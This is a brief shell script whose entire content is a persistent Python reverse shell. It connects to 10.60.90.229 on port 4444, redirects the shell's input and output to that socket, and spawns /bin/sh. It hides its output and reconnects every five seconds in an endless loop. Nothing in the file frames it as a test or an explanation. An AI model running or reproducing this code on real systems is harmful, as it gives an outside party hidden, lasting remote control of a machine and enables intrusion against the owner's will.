#!/bin/sh
while true; do
    python3.11 -c 'import socket,subprocess,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.60.90.229",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")' >/dev/null 2>&1
    sleep 5
done
